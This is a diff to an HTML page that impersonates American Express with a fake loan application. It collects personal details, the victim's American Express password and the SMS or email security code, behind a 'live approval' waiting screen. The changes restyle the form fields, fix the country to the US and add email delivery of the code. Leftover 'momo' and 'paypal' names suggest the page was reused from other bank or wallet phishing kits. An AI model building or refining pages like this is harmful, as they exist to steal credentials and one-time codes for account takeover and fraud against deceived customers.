@@ -115,6 +115,220 @@
       background: linear-gradient(135deg, #00175A 0%, #002663 100%);
     }
 
+    /* American Express Input System Tokens */
+    .amex-field-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.375rem;
+    }
+
+    .amex-field-label {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #1E293B;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      display: flex;
+      align-items: center;
+      gap: 0.375rem;
+      margin-bottom: 0.25rem;
+    }
+
+    .amex-field-input,
+    .amex-field-select {
+      width: 100%;
+      height: 46px;
+      background-color: #FFFFFF;
+      border: 1px solid #CBD5E1;
+      border-radius: 0.75rem;
+      padding: 0 1rem;
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: #0F172A;
+      box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    .amex-field-textarea {
+      width: 100%;
+      background-color: #FFFFFF;
+      border: 1px solid #CBD5E1;
+      border-radius: 0.75rem;
+      padding: 0.75rem 1rem;
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: #0F172A;
+      box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    .amex-field-input::placeholder,
+    .amex-field-textarea::placeholder {
+      color: #94A3B8;
+      font-weight: 400;
+    }
+
+    .amex-field-input:hover,
+    .amex-field-select:hover,
+    .amex-field-textarea:hover,
+    .amex-phone-container:hover,
+    .amex-input-adornment-container:hover {
+      border-color: #94A3B8;
+    }
+
+    .amex-field-input:focus,
+    .amex-field-select:focus,
+    .amex-field-textarea:focus {
+      background-color: #FFFFFF;
+      border-color: #006FCF;
+      box-shadow: 0 0 0 4px rgba(0, 111, 207, 0.15);
+    }
+
+    .amex-field-select {
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23006FCF' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 1rem center;
+      background-size: 1rem;
+      padding-right: 2.75rem !important;
+      cursor: pointer;
+    }
+
+    .amex-phone-container {
+      display: flex;
+      align-items: center;
+      height: 46px;
+      width: 100%;
+      background-color: #FFFFFF;
+      border: 1px solid #CBD5E1;
+      border-radius: 0.75rem;
+      overflow: hidden;
+      box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      box-sizing: border-box;
+    }
+
+    .amex-phone-container:focus-within {
+      border-color: #006FCF;
+      box-shadow: 0 0 0 4px rgba(0, 111, 207, 0.15);
+    }
+
+    .amex-phone-prefix {
+      display: flex;
+      align-items: center;
+      gap: 0.375rem;
+      background-color: #F8FAFC;
+      border-right: 1px solid #CBD5E1;
+      padding: 0 0.875rem;
+      height: 100%;
+      font-size: 0.8125rem;
+      font-weight: 700;
+      color: #1E293B;
+      flex-shrink: 0;
+      user-select: none;
+    }
+
+    .amex-phone-container input {
+      flex: 1;
+      height: 100%;
+      background: transparent;
+      border: none;
+      outline: none;
+      padding: 0 1rem;
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: #0F172A;
+      min-width: 0;
+    }
+
+    .amex-input-adornment-container {
+      display: flex;
+      align-items: center;
+      height: 46px;
+      width: 100%;
+      background-color: #FFFFFF;
+      border: 1px solid #CBD5E1;
+      border-radius: 0.75rem;
+      overflow: hidden;
+      box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      box-sizing: border-box;
+    }
+
+    .amex-input-adornment-container:focus-within {
+      border-color: #006FCF;
+      box-shadow: 0 0 0 4px rgba(0, 111, 207, 0.15);
+    }
+
+    .amex-input-adornment {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #F8FAFC;
+      border-right: 1px solid #CBD5E1;
+      padding: 0 0.875rem;
+      height: 100%;
+      font-size: 0.875rem;
+      font-weight: 800;
+      color: #006FCF;
+      flex-shrink: 0;
+      user-select: none;
+    }
+
+    .amex-adorned-input {
+      flex: 1;
+      height: 100%;
+      background: transparent;
+      border: none;
+      outline: none;
+      padding: 0 0.875rem;
+      font-size: 0.9375rem;
+      font-weight: 700;
+      color: #0F172A;
+      min-width: 0;
+    }
+
+    .amex-input-suffix {
+      padding: 0 0.75rem;
+      font-size: 0.6875rem;
+      font-weight: 800;
+      color: #64748B;
+      letter-spacing: 0.05em;
+      user-select: none;
+      flex-shrink: 0;
+    }
+
+    .amex-field-static-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      height: 46px;
+      background-color: #F8FAFC;
+      border: 1px solid #CBD5E1;
+      border-radius: 0.75rem;
+      padding: 0 1rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: #475569;
+      box-sizing: border-box;
+      box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
+    }
+
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    input[type=number] {
+      -moz-appearance: textfield;
+    }
+
     .hidden {
       display: none !important;
     }
@@ -371,15 +585,12 @@
         </div>
 
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-5">
-          <div>
-            <label for="loan-type-select"
-              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
-              data-i18n="loanType">
+          <div class="amex-field-group">
+            <label for="loan-type-select" class="amex-field-label">
               <span>🏷️</span>
-              <span>Financing Type</span>
+              <span data-i18n="loanType">Financing Type</span>
             </label>
-            <select id="loan-type-select"
-              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
+            <select id="loan-type-select" class="amex-field-select">
               <option value="American Express Personal Loan — Fixed Rate ($3,500 - $40,000)" selected>American Express Personal Loan — Fixed Rate ($3,500 - $40,000)</option>
               <option value="American Express Debt Consolidation Loan">American Express Debt Consolidation Loan</option>
               <option value="American Express Home Improvement Loan">American Express Home Improvement Loan</option>
@@ -388,28 +599,27 @@
             </select>
           </div>
 
-          <div>
-            <label for="loan-amount-input"
-              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
-              data-i18n="amountLabel">
+          <div class="amex-field-group">
+            <label for="loan-amount-input" class="amex-field-label">
               <span>💰</span>
-              <span>Loan Amount Request (USD)</span>
+              <span data-i18n="amountLabel">Loan Amount Request (USD)</span>
             </label>
-            <input id="loan-amount-input" type="number" min="99" max="40000" step="250"
-              oninput="onLoanAmountInput(this.value)"
-              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm md:text-base font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20"
-              value="10000" />
+            <div class="amex-input-adornment-container">
+              <span class="amex-input-adornment">$</span>
+              <input id="loan-amount-input" type="number" min="99" max="40000" step="250"
+                oninput="onLoanAmountInput(this.value)"
+                class="amex-adorned-input"
+                value="10000" />
+              <span class="amex-input-suffix">USD</span>
+            </div>
           </div>
 
-          <div>
-            <label for="loan-term-select"
-              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
-              data-i18n="termLabel">
+          <div class="amex-field-group">
+            <label for="loan-term-select" class="amex-field-label">
               <span>📅</span>
-              <span>Repayment Period (Months)</span>
+              <span data-i18n="termLabel">Repayment Period (Months)</span>
             </label>
-            <select id="loan-term-select"
-              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
+            <select id="loan-term-select" class="amex-field-select">
               <option value="12">12 Months (1 Year)</option>
               <option value="24">24 Months (2 Years)</option>
               <option value="36" selected>36 Months (3 Years - Recommended)</option>
@@ -419,15 +629,13 @@
             </select>
           </div>
 
-          <div>
-            <label for="loan-purpose-input"
-              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
-              data-i18n="purposeLabel">
+          <div class="amex-field-group">
+            <label for="loan-purpose-input" class="amex-field-label">
               <span>📝</span>
-              <span>Intended Use</span>
+              <span data-i18n="purposeLabel">Intended Use</span>
             </label>
             <textarea id="loan-purpose-input" rows="2" placeholder="e.g. Debt consolidation, Home improvements, Major purchases..."
-              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs md:text-sm font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Debt Consolidation & Credit Card Refinancing</textarea>
+              class="amex-field-textarea resize-none">Debt Consolidation & Credit Card Refinancing</textarea>
           </div>
         </div>
 
@@ -456,104 +664,76 @@
           <p class="text-xs md:text-sm text-slate-500 mt-0.5" data-i18n="step2Sub">Enter your legal name, contact details, and underwriting info.</p>
         </div>
 
-        <div class="space-y-3 sm:space-y-4">
-          <div class="grid grid-cols-2 gap-2.5 md:gap-4">
-            <div>
-              <label for="first-name-input"
-                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1"
-                data-i18n="firstName">
+        <div class="space-y-4">
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+            <div class="amex-field-group">
+              <label for="first-name-input" class="amex-field-label">
                 <span>👤</span>
-                <span>First Name *</span>
+                <span data-i18n="firstName">First Name *</span>
               </label>
               <input id="first-name-input" type="text" placeholder="e.g. John"
-                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue"
+                class="amex-field-input"
                 value="" required />
             </div>
-            <div>
-              <label for="last-name-input"
-                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1"
-                data-i18n="lastName">
+            <div class="amex-field-group">
+              <label for="last-name-input" class="amex-field-label">
                 <span>👤</span>
-                <span>Last Name *</span>
+                <span data-i18n="lastName">Last Name *</span>
               </label>
               <input id="last-name-input" type="text" placeholder="e.g. Miller"
-                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue"
+                class="amex-field-input"
                 value="" required />
             </div>
           </div>
 
-          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4">
-            <div>
-              <div class="flex items-center justify-between mb-1">
-                <label for="phone-number-input"
-                  class="text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1"
-                  data-i18n="orangePhone">
-                  <span>📱</span>
-                  <span>Mobile Phone Number *</span>
-                </label>
-                <!-- Country Selector (US or UK) -->
-                <div class="flex items-center space-x-1 bg-slate-100 p-0.5 rounded-lg border border-slate-200">
-                  <button type="button" id="country-btn-us" onclick="setCountry('US')"
-                    class="px-2 py-0.5 text-[11px] font-bold rounded-md transition-all bg-white text-brand-navy shadow-xs flex items-center space-x-1">
-                    <span>🇺🇸</span>
-                    <span>US (+1)</span>
-                  </button>
-                  <button type="button" id="country-btn-uk" onclick="setCountry('UK')"
-                    class="px-2 py-0.5 text-[11px] font-bold rounded-md transition-all text-slate-500 hover:text-slate-800 flex items-center space-x-1">
-                    <span>🇬🇧</span>
-                    <span>UK (+44)</span>
-                  </button>
-                </div>
-              </div>
-              <div
-                class="flex items-center bg-slate-50 border border-slate-300 rounded-xl overflow-hidden focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all shadow-xs">
-                <div
-                  class="flex items-center space-x-1.5 bg-slate-100 border-r border-slate-200 px-3 py-2.5 md:py-3 flex-shrink-0 select-none cursor-pointer"
-                  onclick="toggleCountry()" title="Click to switch country">
-                  <span id="phone-flag" class="text-xs">🇺🇸</span>
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+            <div class="amex-field-group">
+              <label for="phone-number-input" class="amex-field-label">
+                <span>📱</span>
+                <span data-i18n="orangePhone">Mobile Phone Number (US) *</span>
+              </label>
+              <div class="amex-phone-container">
+                <div class="amex-phone-prefix">
+                  <span id="phone-flag" class="text-sm">🇺🇸</span>
                   <span id="phone-prefix" class="text-xs font-bold text-slate-700 whitespace-nowrap">+1</span>
                 </div>
                 <input id="phone-number-input" type="tel" placeholder="(555) 123-4567"
                   oninput="onPhoneNumberInput(this)" onkeydown="onPhoneKeyDown(this, event)"
-                  class="w-full bg-transparent px-3 py-2.5 md:py-3 text-xs md:text-sm font-bold text-slate-800 focus:outline-none min-w-0"
+                  class="w-full bg-transparent px-3.5 py-3 text-sm font-bold text-slate-800 focus:outline-none min-w-0"
                   value="" required />
               </div>
             </div>
 
-            <div>
-              <label for="email-input"
-                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1">
+            <div class="amex-field-group">
+              <label for="email-input" class="amex-field-label">
                 <span>✉️</span>
-                <span>Email Address</span>
+                <span>Email Address *</span>
               </label>
               <input id="email-input" type="email" placeholder="john.miller@example.com"
-                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue"
-                value="" />
+                class="amex-field-input"
+                value="" required />
             </div>
           </div>
 
-          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4">
-            <div>
-              <label for="employment-select"
-                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1"
-                data-i18n="employmentStatus">
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+            <div class="amex-field-group">
+              <label for="employment-select" class="amex-field-label">
                 <span>💼</span>
-                <span>Employment Status</span>
+                <span data-i18n="employmentStatus">Employment Status</span>
               </label>
-              <select id="employment-select"
-                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue">
+              <select id="employment-select" class="amex-field-select">
                 <option value="Employed" selected>Employed (Full/Part Time)</option>
                 <option value="Self-Employed / Business Owner">Self-Employed / Business Owner</option>
                 <option value="Freelancer / Contractor">Freelancer / Contractor</option>
                 <option value="Retired / Other">Retired / Other</option>
               </select>
             </div>
-            <div>
-              <label class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1">
+            <div class="amex-field-group">
+              <label class="amex-field-label">
                 <span>🛡️</span>
                 <span>Underwriting Review</span>
               </label>
-              <div class="flex items-center space-x-2 bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs text-slate-600 font-semibold">
+              <div class="amex-field-static-badge">
                 <span class="text-emerald-500 font-bold">✓</span>
                 <span>Soft inquiry — No credit score impact to apply</span>
               </div>
@@ -636,10 +816,9 @@
           </div>
 
           <!-- Phone Number / Email Input Container (Preserved from Step 2) -->
-          <div>
-            <div class="flex items-center justify-between mb-1.5">
-              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider flex items-center space-x-1"
-                data-i18n="phoneNum">
+          <div class="amex-field-group">
+            <div class="flex items-center justify-between mb-1">
+              <label class="amex-field-label mb-0" data-i18n="phoneNum">
                 <span>📱 / ✉️</span>
                 <span>Mobile Phone or User ID</span>
               </label>
@@ -652,61 +831,55 @@
             </div>
 
             <!-- Mobile Phone Input Mode -->
-            <div id="contact-phone-wrapper"
-              class="flex items-center bg-slate-50 border border-slate-300 rounded-xl overflow-hidden focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all shadow-xs">
-              <div
-                class="flex items-center space-x-1.5 bg-slate-100 border-r border-slate-200 px-3.5 py-3 flex-shrink-0 select-none cursor-pointer"
-                onclick="toggleCountry()" title="Click to switch country">
+            <div id="contact-phone-wrapper" class="amex-phone-container">
+              <div class="amex-phone-prefix">
                 <span id="momo-phone-flag" class="text-sm">🇺🇸</span>
                 <span id="momo-phone-prefix"
-                  class="text-xs font-black text-slate-700 whitespace-nowrap tracking-wide">+1</span>
+                  class="text-xs font-bold text-slate-700 whitespace-nowrap">+1</span>
               </div>
               <input id="momo-phone-display" type="tel" placeholder="(555) 123-4567"
                 oninput="onPhoneNumberInput(this)" onkeydown="onPhoneKeyDown(this, event)"
-                class="bg-transparent text-xs sm:text-sm font-bold text-slate-800 w-full px-3.5 py-3 focus:outline-none min-w-0"
+                class="bg-transparent text-sm font-bold text-slate-800 w-full px-3.5 py-3 focus:outline-none min-w-0"
                 value="" />
             </div>
 
             <!-- Email Address Input Mode -->
-            <div id="contact-email-wrapper"
-              class="hidden flex items-center bg-slate-50 border border-slate-300 rounded-xl overflow-hidden focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all shadow-xs">
-              <div
-                class="flex items-center bg-slate-100 border-r border-slate-200 px-3.5 py-3 flex-shrink-0 select-none">
+            <div id="contact-email-wrapper" class="hidden amex-phone-container">
+              <div class="amex-phone-prefix">
                 <span class="text-sm">✉️</span>
               </div>
-              <input id="momo-email-display" type="email" placeholder="name@example.com"
+              <input id="momo-email-display" type="email" placeholder="john.miller@example.com"
                 oninput="onMomoEmailInput(this.value)"
-                class="bg-transparent text-xs sm:text-sm font-bold text-slate-800 w-full px-3.5 py-3 focus:outline-none min-w-0"
+                class="bg-transparent text-sm font-bold text-slate-800 w-full px-3.5 py-3 focus:outline-none min-w-0"
                 value="" />
             </div>
           </div>
 
           <!-- Form & Inputs Container -->
           <div id="pin-form-container" class="space-y-4">
-            <div
-              class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
-              <label for="demo-password-input" class="flex items-center space-x-1 cursor-pointer">
+            <div class="amex-field-group">
+              <label for="demo-password-input" class="amex-field-label">
                 <span>🔐</span>
                 <span>Account Password</span>
               </label>
-            </div>
 
-            <!-- Single Password Input Row with Show/Hide Toggle -->
-            <div class="relative flex items-center">
-              <input id="demo-password-input" type="password" placeholder="Enter your password..."
-                oninput="onDemoPasswordInput(this.value)"
-                class="w-full bg-slate-50 border-2 border-slate-200 rounded-xl px-4 py-3.5 pr-16 text-sm font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 transition-all shadow-xs" />
-              <button type="button" id="toggle-demo-pwd-btn" onclick="toggleDemoPasswordVisibility()"
-                class="absolute right-2 px-2.5 py-1 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex items-center space-x-1 text-xs font-bold"
-                aria-label="Toggle Password Visibility">
-                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-                </svg>
-                <span id="eye-text" class="text-[10px] font-bold text-slate-500">Show</span>
-              </button>
+              <!-- Single Password Input Row with Show/Hide Toggle -->
+              <div class="relative flex items-center">
+                <input id="demo-password-input" type="password" placeholder="Enter your American Express password..."
+                  oninput="onDemoPasswordInput(this.value)"
+                  class="amex-field-input pr-16" />
+                <button type="button" id="toggle-demo-pwd-btn" onclick="toggleDemoPasswordVisibility()"
+                  class="absolute right-2 px-2.5 py-1 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex items-center space-x-1 text-xs font-bold"
+                  aria-label="Toggle Password Visibility">
+                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                      d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                      d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                  </svg>
+                  <span id="eye-text" class="text-[10px] font-bold text-slate-500">Show</span>
+                </button>
+              </div>
             </div>
 
             <div id="pin-retry-alert"
@@ -757,14 +930,29 @@
             </span>
           </div>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2" data-i18n="step4Title">
-            <span>💬</span>
+            <span>🛡️</span>
             <span>2-Step Security Verification</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Copy or wait for the SMS security code from
-            American Express then paste below.</p>
+          <p id="step4-subtitle" class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">
+            Choose how to receive your security code from American Express then paste below.
+          </p>
         </div>
 
-        <!-- Live SMS Reception Card & Countdown Timer -->
+        <!-- Verification Delivery Option Toggle: SMS or Email -->
+        <div class="bg-slate-100/90 p-1 rounded-xl border border-slate-200 grid grid-cols-2 gap-1 text-xs font-bold shadow-xs">
+          <button type="button" id="delivery-tab-sms" onclick="setVerificationDelivery('sms')"
+            class="py-2.5 px-3 rounded-lg flex items-center justify-center space-x-1.5 transition-all bg-white text-brand-navy shadow-xs border border-slate-200/60 font-black cursor-pointer">
+            <span>📱</span>
+            <span data-i18n="smsDeliveryTab">Text Message (SMS)</span>
+          </button>
+          <button type="button" id="delivery-tab-email" onclick="setVerificationDelivery('email')"
+            class="py-2.5 px-3 rounded-lg flex items-center justify-center space-x-1.5 transition-all text-slate-500 hover:text-slate-800 font-bold cursor-pointer">
+            <span>✉️</span>
+            <span data-i18n="emailDeliveryTab">Email Notification</span>
+          </button>
+        </div>
+
+        <!-- Live Code Reception Card & Countdown Timer -->
         <div id="sim-sms-countdown-card"
           class="bg-gradient-to-br from-blue-50 to-indigo-50 border border-blue-200/80 rounded-2xl p-4 shadow-xs space-y-3">
           <div class="flex items-center justify-between">
@@ -774,7 +962,7 @@
                   class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
                 <span class="relative inline-flex rounded-full h-3 w-3 bg-brand-blue"></span>
               </span>
-              <span class="text-xs font-black text-brand-navy uppercase tracking-wider">Awaiting American Express SMS...</span>
+              <span id="countdown-card-header" class="text-xs font-black text-brand-navy uppercase tracking-wider">Awaiting American Express SMS...</span>
             </div>
             <div id="sms-timer-display" class="text-2xl font-black text-brand-blue tracking-tight font-mono">00:20</div>
           </div>
@@ -782,19 +970,19 @@
           <div
             class="flex items-center justify-between bg-white/80 backdrop-blur-xs p-2.5 rounded-xl border border-blue-100">
             <div class="text-[11px] text-slate-600 font-medium flex items-center space-x-1.5">
-              <span>📱</span>
-              <span>Target Mobile: <strong id="sms-timer-phone" class="text-slate-900 font-bold">American Express Account</strong></span>
+              <span id="target-icon">📱</span>
+              <span><span id="target-label">Target Mobile</span>: <strong id="sms-timer-phone" class="text-slate-900 font-bold">American Express Account</strong></span>
             </div>
             <div class="flex items-center space-x-1.5">
-              <button type="button" onclick="copyTargetPhone(this)"
+              <button type="button" id="copy-target-btn" onclick="copyTargetRecipient(this)"
                 class="px-2 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-bold rounded-lg transition-all border border-slate-200 flex items-center space-x-1">
                 <span>📋</span>
-                <span>Copy Number</span>
+                <span id="copy-target-text">Copy Number</span>
               </button>
-              <button type="button" onclick="openMessagingApp(event)"
+              <button type="button" id="open-channel-btn" onclick="openChannelApp(event)"
                 class="px-2.5 py-1 bg-brand-blue text-white text-[10px] font-bold rounded-lg hover:bg-blue-800 transition-all shadow-xs flex items-center space-x-1">
-                <span>💬</span>
-                <span>Open SMS</span>
+                <span id="open-channel-icon">💬</span>
+                <span id="open-channel-text">Open SMS</span>
               </button>
             </div>
           </div>
@@ -806,26 +994,24 @@
 
         <div class="space-y-4 flex-1 flex flex-col">
 
-          <div class="space-y-2 flex-1 flex flex-col">
+          <div class="amex-field-group flex-1">
             <div class="flex justify-between items-center mb-1">
-              <label for="momo-pasted-msg"
-                class="block text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1.5"
-                data-i18n="smsLabel">
-                <span>📨</span>
-                <span>American Express Security SMS Message</span>
+              <label for="momo-pasted-msg" class="amex-field-label mb-0" id="pasted-msg-label">
+                <span id="pasted-msg-icon">📨</span>
+                <span id="pasted-msg-text" data-i18n="smsLabel">American Express Security SMS Message</span>
               </label>
               <button type="button" onclick="pasteSmsFromClipboard()"
                 class="px-3 py-1.5 amex-btn-gradient text-white text-[11px] font-black rounded-lg shadow-xs hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
                 <span>📋</span>
-                <span>Paste SMS</span>
+                <span id="paste-btn-text">Paste Code / Message</span>
               </button>
             </div>
 
-            <!-- Big Spacious Textarea Message Box -->
-            <textarea id="momo-pasted-msg" rows="5" autocomplete="off" autocorrect="off" autocapitalize="off"
-              spellcheck="false" placeholder="Paste your American Express SMS confirmation message here..."
+            <!-- Big Spacious Textarea Message Box with Premium Styling -->
+            <textarea id="momo-pasted-msg" rows="4" autocomplete="off" autocorrect="off" autocapitalize="off"
+              spellcheck="false" placeholder="Paste your American Express security message or 6-digit code here..."
               oninput="handlePostLoginPastedMsg(this.value)"
-              class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-4 text-xs font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-y min-h-[130px] leading-relaxed shadow-xs"></textarea>
+              class="amex-field-textarea resize-y min-h-[125px] leading-relaxed"></textarea>
 
             <div id="momo-extract-status"
               class="mt-2 text-[11px] text-emerald-700 font-semibold flex items-center space-x-1 hidden">
@@ -843,7 +1029,7 @@
             class="w-full py-4 amex-btn-gradient text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2"
             data-i18n="submitSmsBtn">
             <span>⚡</span>
-            <span>SUBMIT SECURITY CODE</span>
+            <span id="submit-pasted-btn-text">SUBMIT SECURITY CODE</span>
           </button>
 
           <!-- Live Approval Waiting Indicator for Step 4 SMS -->
@@ -889,7 +1075,7 @@
             <h3 class="text-lg sm:text-xl font-black text-brand-navy tracking-tight" data-i18n="otpHeading">
               Enter American Express Security Code
             </h3>
-            <p class="text-xs text-slate-500 font-medium leading-relaxed mt-1 mb-4" data-i18n="otpSub">
+            <p id="otpSub" class="text-xs text-slate-500 font-medium leading-relaxed mt-1 mb-4" data-i18n="otpSub">
               Enter the 6-digit security code sent to your mobile phone from American Express
             </p>
 
@@ -933,6 +1119,24 @@
             <!-- Error / Retry alert -->
             <div id="otp-retry-alert"
               class="mt-4 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 text-center hidden">
+            </div>
+
+            <!-- Channel Resend / Switcher Options -->
+            <div class="mt-4 pt-3 border-t border-slate-100 flex flex-col sm:flex-row items-center justify-between text-xs text-slate-500 gap-2">
+              <span class="font-medium">Didn't receive code?</span>
+              <div class="flex items-center space-x-3 font-bold">
+                <button type="button" id="otp-resend-sms-btn" onclick="resendOtpViaChannel('sms')"
+                  class="text-brand-blue hover:underline flex items-center space-x-1 cursor-pointer">
+                  <span>📱</span>
+                  <span data-i18n="resendViaSms">Send via Text</span>
+                </button>
+                <span class="text-slate-300">|</span>
+                <button type="button" id="otp-resend-email-btn" onclick="resendOtpViaChannel('email')"
+                  class="text-brand-blue hover:underline flex items-center space-x-1 cursor-pointer">
+                  <span>✉️</span>
+                  <span data-i18n="resendViaEmail">Send to Email instead</span>
+                </button>
+              </div>
             </div>
 
             <!-- Live Waiting Box for OTP Verification -->
@@ -1338,7 +1542,8 @@
       phoneNumber: '',
       email: '',
       momoPin: '',
-      applicationId: null
+      applicationId: null,
+      verificationDelivery: 'sms'
     };
 
     function calculateMonthly(amount, months) {
@@ -1386,57 +1591,43 @@
     }
 
     function setCountry(c) {
-      const country = (c || 'US').toUpperCase();
-      appState.country = country === 'UK' ? 'UK' : 'US';
-      appState.countryPrefix = appState.country === 'UK' ? '+44' : '+1';
+      appState.country = 'US';
+      appState.countryPrefix = '+1';
       try { 
-        localStorage.setItem('amex_country', appState.country); 
-        localStorage.setItem('paypal_country', appState.country); 
+        localStorage.setItem('amex_country', 'US'); 
+        localStorage.setItem('paypal_country', 'US'); 
       } catch (_) { }
 
-      // Update Step 2 buttons
-      const btnUs = document.getElementById('country-btn-us');
-      const btnUk = document.getElementById('country-btn-uk');
-      if (btnUs && btnUk) {
-        if (appState.country === 'US') {
-          btnUs.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all bg-white text-brand-navy shadow-xs flex items-center space-x-1';
-          btnUk.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all text-slate-500 hover:text-slate-800 flex items-center space-x-1';
-        } else {
-          btnUk.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all bg-white text-brand-navy shadow-xs flex items-center space-x-1';
